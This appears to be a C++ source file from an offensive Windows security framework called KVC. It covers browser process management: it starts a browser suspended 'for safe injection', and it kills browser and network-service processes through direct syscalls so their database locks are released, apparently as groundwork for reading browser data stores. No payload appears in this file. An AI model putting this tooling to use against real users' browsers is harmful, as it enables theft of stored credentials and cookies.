/*******************************************************************************
  _  ____     ______ 
 | |/ /\ \   / / ___|
 | ' /  \ \ / / |    
 | . \   \ V /| |___ 
 |_|\_\   \_/  \____|

The **Kernel Vulnerability Capabilities (KVC)** framework represents a paradigm shift in Windows security research, 
offering unprecedented access to modern Windows internals through sophisticated ring-0 operations. Originally conceived 
as "Kernel Process Control," the framework has evolved to emphasize not just control, but the complete **exploitation 
of kernel-level primitives** for legitimate security research and penetration testing.

KVC addresses the critical gap left by traditional forensic tools that have become obsolete in the face of modern Windows 
security hardening. Where tools like ProcDump and Process Explorer fail against Protected Process Light (PPL) and Antimalware 
Protected Interface (AMSI) boundaries, KVC succeeds by operating at the kernel level, manipulating the very structures 
that define these protections.

  -----------------------------------------------------------------------------
  Author : Marek Wesołowski
  Email  : marek@wesolowski.eu.org
  Phone  : +48 607 440 283 (Tel/WhatsApp)
  Date   : 04-09-2025

*******************************************************************************/

// BrowserProcessManager.cpp - Browser process management and cleanup operations
#include "BrowserProcessManager.h"
#include "syscalls.h"
#include <stdexcept>

#ifndef IMAGE_FILE_MACHINE_AMD64
#define IMAGE_FILE_MACHINE_AMD64 0x8664
#endif

#ifndef IMAGE_FILE_MACHINE_I386
#define IMAGE_FILE_MACHINE_I386 0x014c
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Handle cleanup using direct syscall
void HandleDeleter::operator()(HANDLE h) const noexcept
{
    if (h && h != INVALID_HANDLE_VALUE)
        NtClose_syscall(h);
}

// Constructor initializes target process context
TargetProcess::TargetProcess(const Configuration& config, const Console& console) 
    : m_config(config), m_console(console) {}

// Creates suspended browser process for safe injection
void TargetProcess::createSuspended()
{
    m_console.Debug("Creating suspended " + m_config.browserDisplayName + " process.");
    m_console.Debug("Target executable path: " + Utils::WStringToUtf8(m_config.browserDefaultExePath));

    STARTUPINFOW si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    if (!CreateProcessW(m_config.browserDefaultExePath.c_str(), nullptr, nullptr, nullptr,
                       FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
        throw std::runtime_error("CreateProcessW failed. Error: " + std::to_string(GetLastError()));

    m_hProcess.reset(pi.hProcess);
    m_hThread.reset(pi.hThread);
    m_pid = pi.dwProcessId;

    m_console.Debug("Created suspended process PID: " + std::to_string(m_pid));
    checkArchitecture();
}

// Terminates target process via direct syscall
void TargetProcess::terminate()
{
    if (m_hProcess)
    {
        m_console.Debug("Terminating browser PID=" + std::to_string(m_pid) + " via direct syscall.");
        NtTerminateProcess_syscall(m_hProcess.get(), 0);
        m_console.Debug(m_config.browserDisplayName + " terminated by orchestrator.");
    }
}

// Validates matching x64 architecture
void TargetProcess::checkArchitecture()
{
    USHORT processArch = 0, nativeMachine = 0;
    auto fnIsWow64Process2 = (decltype(&IsWow64Process2))GetProcAddress(
        GetModuleHandleW(L"kernel32.dll"), "IsWow64Process2");
    if (!fnIsWow64Process2 || !fnIsWow64Process2(m_hProcess.get(), &processArch, &nativeMachine))
        throw std::runtime_error("Failed to determine target process architecture.");

    m_arch = (processArch == IMAGE_FILE_MACHINE_UNKNOWN) ? nativeMachine : processArch;
    constexpr USHORT orchestratorArch = IMAGE_FILE_MACHINE_AMD64;

    if (m_arch != orchestratorArch)
        throw std::runtime_error("Architecture mismatch. Orchestrator is x64 but target is " + 
                               std::string(getArchName(m_arch)));

    m_console.Debug("Architecture match: Orchestrator=x64, Target=" + std::string(getArchName(m_arch)));
}

// Returns human-readable architecture name
const char* TargetProcess::getArchName(USHORT arch) const noexcept
{
    switch (arch)
    {
    case IMAGE_FILE_MACHINE_AMD64: return "x64";
    case IMAGE_FILE_MACHINE_I386:  return "x86";
    default:                       return "Unknown";
    }
}

// Terminates all browser processes matching the target executable name
void KillBrowserProcesses(const Configuration& config, const Console& console)
{
    console.Debug("Terminating all browser processes to release file locks...");

    UniqueHandle hCurrentProc;
    HANDLE nextProcHandle = nullptr;
    int processes_terminated = 0;

    while (NT_SUCCESS(NtGetNextProcess_syscall(hCurrentProc.get(), PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, 
                                             0, 0, &nextProcHandle)))
    {
        UniqueHandle hNextProc(nextProcHandle);
        hCurrentProc = std::move(hNextProc);
        
        std::vector<BYTE> buffer(sizeof(UNICODE_STRING_SYSCALLS) + MAX_PATH * 2);
        auto imageName = reinterpret_cast<PUNICODE_STRING_SYSCALLS>(buffer.data());
        if (!NT_SUCCESS(NtQueryInformationProcess_syscall(hCurrentProc.get(), ProcessImageFileName, 
                                                         imageName, (ULONG)buffer.size(), NULL)) || 
            imageName->Length == 0)
            continue;

        fs::path p(std::wstring(imageName->Buffer, imageName->Length / sizeof(wchar_t)));
        if (_wcsicmp(p.filename().c_str(), config.browserProcessName.c_str()) != 0)
            continue;
        
        PROCESS_BASIC_INFORMATION pbi{};
        if (!NT_SUCCESS(NtQueryInformationProcess_syscall(hCurrentProc.get(), ProcessBasicInformation, 
                                                         &pbi, sizeof(pbi), nullptr)) || 
            !pbi.PebBaseAddress)
            continue;

        console.Debug("Found and terminated browser process PID: " + std::to_string((DWORD)pbi.UniqueProcessId));
        NtTerminateProcess_syscall(hCurrentProc.get(), 0);
        processes_terminated++;
    }

    if (processes_terminated > 0)
    {
        console.Debug("Terminated " + std::to_string(processes_terminated) + " browser processes. Waiting for file locks to release.");
        Sleep(2000); 
    }
}

// Terminates browser network service processes that hold database locks
void KillBrowserNetworkService(const Configuration& config, const Console& console)
{
    console.Debug("Scanning for and terminating browser network services...");

    UniqueHandle hCurrentProc;
    HANDLE nextProcHandle = nullptr;
    int processes_terminated = 0;
    
    while (NT_SUCCESS(NtGetNextProcess_syscall(hCurrentProc.get(), PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_TERMINATE, 
                                             0, 0, &nextProcHandle)))
    {
        UniqueHandle hNextProc(nextProcHandle);
        hCurrentProc = std::move(hNextProc);
        
        std::vector<BYTE> buffer(sizeof(UNICODE_STRING_SYSCALLS) + MAX_PATH * 2);
        auto imageName = reinterpret_cast<PUNICODE_STRING_SYSCALLS>(buffer.data());
        if (!NT_SUCCESS(NtQueryInformationProcess_syscall(hCurrentProc.get(), ProcessImageFileName, 
                                                         imageName, (ULONG)buffer.size(), NULL)) || 
            imageName->Length == 0)
            continue;

        fs::path p(std::wstring(imageName->Buffer, imageName->Length / sizeof(wchar_t)));
        if (_wcsicmp(p.filename().c_str(), config.browserProcessName.c_str()) != 0)
            continue;
        
        PROCESS_BASIC_INFORMATION pbi{};
        if (!NT_SUCCESS(NtQueryInformationProcess_syscall(hCurrentProc.get(), ProcessBasicInformation, 
                                                         &pbi, sizeof(pbi), nullptr)) || 
            !pbi.PebBaseAddress)
            continue;

        PEB peb{};
        if (!NT_SUCCESS(NtReadVirtualMemory_syscall(hCurrentProc.get(), pbi.PebBaseAddress, &peb, sizeof(peb), nullptr)))
            continue;

        RTL_USER_PROCESS_PARAMETERS params{};
        if (!NT_SUCCESS(NtReadVirtualMemory_syscall(hCurrentProc.get(), peb.ProcessParameters, &params, sizeof(params), nullptr)))
            continue;
        
        std::vector<wchar_t> cmdLine(params.CommandLine.Length / sizeof(wchar_t) + 1, 0);
        if (params.CommandLine.Length > 0 && 
            !NT_SUCCESS(NtReadVirtualMemory_syscall(hCurrentProc.get(), params.CommandLine.Buffer, 
                                                   cmdLine.data(), params.CommandLine.Length, nullptr)))
            continue;
        
        if (wcsstr(cmdLine.data(), L"--utility-sub-type=network.mojom.NetworkService"))
        {
            console.Debug("Found and terminated network service PID: " + std::to_string((DWORD)pbi.UniqueProcessId));
            NtTerminateProcess_syscall(hCurrentProc.get(), 0);
            processes_terminated++;
        }
    }

    if (processes_terminated > 0)
    {
        console.Debug("Termination sweep complete. Waiting for file locks to fully release.");
        Sleep(1500);
    }
}

// Checks if Windows native SQLite library is available
bool CheckWinSQLite3Available()
{
    HMODULE hWinSQLite = LoadLibraryW(L"winsqlite3.dll");
    if (hWinSQLite)
    {
        FreeLibrary(hWinSQLite);
        return true;
    }
    return false;
}